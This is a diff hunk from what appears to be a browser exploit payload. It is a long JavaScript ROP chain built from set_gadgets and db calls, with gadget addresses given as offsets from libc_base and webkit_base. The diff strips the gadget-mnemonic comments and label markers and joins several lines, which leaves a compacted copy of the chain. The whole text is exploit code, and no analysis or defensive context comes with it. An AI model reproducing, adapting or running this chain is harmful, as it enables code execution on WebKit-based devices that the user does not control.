@@ -65,219 +65,173 @@ db([8,0]); set_gadgets([ libc_base+207036, libc_base+430587, libc_base+713278, r
 db([16,0]);set_gadget(libc_base+772328,);
 db([0,0]);
 set_gadgets([
-libc_base+507828,//add rax,rsi
+libc_base+507828,
 libc_base+713278,
-ropchain+67152,//L35
+ropchain+67152,
 webkit_base+4687784,
-libc_base+388400,//mov rax,rdi
+libc_base+388400,
 libc_base+713278,
-ropchain+67168,//L36
+ropchain+67168,
 webkit_base+4687784,
-libc_base+863109,//mov rax,rcx
+libc_base+863109,
 libc_base+165442
 ]);
-//L35:
-db([0,0]);
-set_gadget(libc_base+772328,);
-//L36:
+db([0,0]);set_gadget(libc_base+772328,);
 db([0,0]);
 set_gadgets([
-libc_base+229840,//mov ax,[rdi]
+libc_base+229840,
 libc_base+713278,
-ropchain+67328,//L40
+ropchain+67328,
 webkit_base+4687784,
-libc_base+388400,//mov rax,rdi
+libc_base+388400,
 libc_base+713278,
-ropchain+67280,//L37
+ropchain+67280,
 webkit_base+4687784,
-libc_base+863109,//mov rax,rcx
+libc_base+863109,
 libc_base+713278,
-ropchain+67296,//L38
+ropchain+67296,
 webkit_base+4687784,
-webkit_base+3789839 //pop r11
+webkit_base+3789839
 ]);
-//L37:
-db([0,0]);
-set_gadget(libc_base+165442,);
-//L38:
-db([0,0]);
-set_gadget(libc_base+772328,);
-//L39:
-db([16,0]);// 0x10
-set_gadget(libc_base+768796,);
-//L40:
+db([0,0]);set_gadget(libc_base+165442,);
+db([0,0]);set_gadget(libc_base+772328,);
+db([16,0]);set_gadget(libc_base+768796,);
 db([0,0]);
 set_gadgets([
 libc_base+857161,
 libc_base+713278,
-ropchain+67384,//L42
+ropchain+67384,
 webkit_base+4687784,
-libc_base+388400,//mov rax,rdi
+libc_base+388400,
 libc_base+165442
 ]);
-//L42:
 db([0,0]);
 set_gadgets([
 libc_base+288783,
 libc_base+713278,
-ropchain+67496,//L43
+ropchain+67496,
 webkit_base+4687784,
 webkit_base+13378624,
 libc_base+713278,
-ropchain+67528,//L45
+ropchain+67528,
 webkit_base+4687784,
-webkit_base+1816389,//mov rax,r11
+webkit_base+1816389,
 libc_base+713278,
-ropchain+67512,//L44
+ropchain+67512,
 webkit_base+4687784,
-webkit_base+3789839 //pop r11
+webkit_base+3789839
 ]);
-//L43:
-db([0,0]);
-set_gadget(libc_base+772328,);
-//L44:
-db([0,0]);
-set_gadget(libc_base+768796,);
-//L45:
+db([0,0]);set_gadget(libc_base+772328,);
+db([0,0]);set_gadget(libc_base+768796,);
 db([0,0]);
 set_gadgets([
-webkit_base+6264134,//movsxd rax,edi
+webkit_base+6264134,
 libc_base+713278,
-ropchain+67688,//L49
+ropchain+67688,
 webkit_base+4687784,
-libc_base+863109,//mov rax,rcx
+libc_base+863109,
 libc_base+713278,
-ropchain+67640,//L46
+ropchain+67640,
 webkit_base+4687784,
-webkit_base+1816389,//mov rax,r11
+webkit_base+1816389,
 libc_base+713278,
-ropchain+67656,//L47
+ropchain+67656,
 webkit_base+4687784,
-webkit_base+3789839 //pop r11
+webkit_base+3789839
 ]);
-//L46:
-db([0,0]);
-set_gadget(libc_base+165442,);
-//L47:
-db([0,0]);
-set_gadget(libc_base+772328,);
-//L48:
-db([48,0]);
-set_gadget(libc_base+768796,);
-//L49:
+db([0,0]);set_gadget(libc_base+165442,);
+db([0,0]);set_gadget(libc_base+772328,);
+db([48,0]);set_gadget(libc_base+768796,);
 db([0,0]);
 set_gadgets([
 libc_base+857161,
 libc_base+857183,
 libc_base+713278,
-ropchain+67792,//L51
+ropchain+67792,
 webkit_base+4687784,
-webkit_base+1816389,//mov rax,r11
+webkit_base+1816389,
 libc_base+713278,
-ropchain+67776,//L50
+ropchain+67776,
 webkit_base+4687784,
 libc_base+772328
 ]);
-//L50:
-db([0,0]);
-set_gadget(libc_base+768796,);
-//L51:
-db([0,0]);
-set_gadget(libc_base+713278,);
-db([8,0]);// 0x8
+db([0,0]);set_gadget(libc_base+768796,);
+db([0,0]);set_gadget(libc_base+713278,);
+db([8,0]);
 set_gadgets([
 libc_base+207036,
 libc_base+430587,
 libc_base+768796
 ]);
-//L52:
-db([8,0]);// 0x8
-set_gadget(libc_base+772328,);
-//L53:
-db([8,0]);// 0x8
+db([8,0]);set_gadget(libc_base+772328,);
+db([8,0]);
 set_gadgets([
-libc_base+149872,//mov rax,[rdi]
+libc_base+149872,
 libc_base+713278
 ]);
-db([4294967288,4294967295]);// -0x8
+db([4294967288,4294967295]);
 set_gadgets([
 libc_base+207036,
 libc_base+713278,
-ropchain+67992,//L56
+ropchain+67992,
 webkit_base+4687784,
-libc_base+863109,//mov rax,rcx
+libc_base+863109,
 libc_base+713278,
-ropchain+67960,//L54
+ropchain+67960,
 webkit_base+4687784,
-webkit_base+3789839 //pop r11
+webkit_base+3789839
 ]);
-//L54:
-db([0,0]);
-set_gadget(libc_base+772328,);
-//L55:
-db([32,0]);// 0x20
-set_gadget(libc_base+768796,);
-//L56:
+db([0,0]);set_gadget(libc_base+772328,);
+db([32,0]);set_gadget(libc_base+768796,);
 db([0,0]);
 set_gadgets([
 libc_base+857161,
 libc_base+857183,
 libc_base+713278,
-ropchain+68096,//L58
+ropchain+68096,
 webkit_base+4687784,
-webkit_base+1816389,//mov rax,r11
+webkit_base+1816389,
 libc_base+713278,
-ropchain+68080,//L57
+ropchain+68080,
 webkit_base+4687784,
 libc_base+772328
 ]);
-//L57:
-db([0,0]);
-set_gadget(libc_base+768796,);
-//L58:
+db([0,0]);set_gadget(libc_base+768796,);
 db([0,0]);
 set_gadgets([
 libc_base+857183,
 libc_base+713278,
-ropchain+68208,//L61
+ropchain+68208,
 webkit_base+4687784,
-libc_base+863109,//mov rax,rcx
+libc_base+863109,
 libc_base+713278,
-ropchain+68176,//L59
+ropchain+68176,
 webkit_base+4687784,
-webkit_base+3789839 //pop r11
+webkit_base+3789839
 ]);
-//L59:
-db([0,0]);
-set_gadget(libc_base+772328,);
-//L60:
-db([48,0]);
-set_gadget(libc_base+768796,);
-//L61:
+db([0,0]);set_gadget(libc_base+772328,);
+db([48,0]);set_gadget(libc_base+768796,);
 db([0,0]);
 set_gadgets([
 libc_base+857161,
 libc_base+857183,
 libc_base+713278,
-ropchain+68272,//L63
+ropchain+68272,
 webkit_base+4687784,
-webkit_base+1816389,//mov rax,r11
+webkit_base+1816389,
 libc_base+772328
 ]);
-//L63:
 db([0,0]);
 set_gadgets([
-libc_base+149872,//mov rax,[rdi]
+libc_base+149872,
 libc_base+713278,
-ropchain+68328,//L65
+ropchain+68328,
 webkit_base+4687784,
-libc_base+863109,//mov rax,rcx
+libc_base+863109,
 libc_base+772328
 ]);
-//L65:
-db([0,0]);
-set_gadget(libc_base+713278,);
-db([4294967288,4294967295]);// -0x8
+db([0,0]);set_gadget(libc_base+713278,);
+db([4294967288,4294967295]);
 set_gadgets([
 libc_base+207036,
 webkit_base+72932,//or rax,rcx
